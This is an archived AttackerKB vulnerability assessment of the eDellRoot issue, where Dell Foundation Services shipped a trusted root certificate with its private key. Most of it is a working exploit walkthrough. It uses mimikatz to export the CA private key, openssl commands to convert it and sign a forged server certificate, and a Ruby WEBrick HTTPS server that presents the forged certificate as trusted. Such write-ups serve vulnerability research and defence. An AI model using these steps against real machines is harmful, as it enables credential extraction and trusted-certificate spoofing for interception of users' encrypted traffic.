---
title: Dell Foundation Services installs root certificate and private key (eDellRoot)
author: wchen-r7
score: 1
topic_attacker_value: 5
topic_exploitability: 3
created: '2019-09-12T18:07:22.305489'
revision_date: '2020-02-13T17:12:17.00383'
assessment_id: 684dc100-6e09-4ba9-978e-0cf2aab73eb3
topic_id: 75d27812-f60e-4f57-a96a-929bbc231185
topic_short_id: 5WoFEgM51m
topic_slug: dell-foundation-services-installs-root-certificate-and-private-key-edellroot
akb_topic_url: https://attackerkb.com/topics/5WoFEgM51m/dell-foundation-services-installs-root-certificate-and-private-key-edellroot
akb_assessment_url: https://attackerkb.com/topics/5WoFEgM51m/dell-foundation-services-installs-root-certificate-and-private-key-edellroot#684dc100-6e09-4ba9-978e-0cf2aab73eb3
---

# Dell Foundation Services installs root certificate and private key (eDellRoot)

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/5WoFEgM51m/dell-foundation-services-installs-root-certificate-and-private-key-edellroot#684dc100-6e09-4ba9-978e-0cf2aab73eb3).*

---

# Details

How to exploit:

* Export the DER CA certificate (through the windows certificate manager for example).
* Covert DER CA certificate to PEM

```
openssl x509 -in der_edell_root.cer -inform der -outform pem -out edell_root.pem
```

* Export the certificate private key, use mimikatz

```
crypto::certificates /systemstore:local_machine /store:Root /export
```

The certificate (again) and its private key will be in the directory where mimikatz lives. The private key is inside the .pfx

* Extract the key from the pfx and save as pem (password: mimikatz)

```
openssl pkcs12 -in local_machine_Root_3_eDellRoot.pfx -nocerts -out key.pem -nodes
```

* Save the file.srl with “6C”

* Create a server certificate request

```
openssl genrsa -out server.key 1024
openssl req -key server.key -new -out server.req
```

Use the CA certificate and its private key to generate the server certificate:

```
openssl x509 -req -in server.req -CA edell_root.pem -CAkey key.pem -CAserial file.srl -out server.pem
```

profit!

```ruby
require 'webrick'
require 'webrick/https'
require 'openssl'

cert = OpenSSL::X509::Certificate.new(File.read('server.pem'))
pkey = OpenSSL::PKey::RSA.new(File.read('server.key'))

server = WEBrick::HTTPServer.new(:Port => 8000, :SSLEnable => true, :SSLCertificate => cert, :SSLPrivateKey => pkey)
server.start
```

Go to localhost:8000/test.html, you should see that eDellRoot has identified the site as localhos,
and that your connection is trusted.
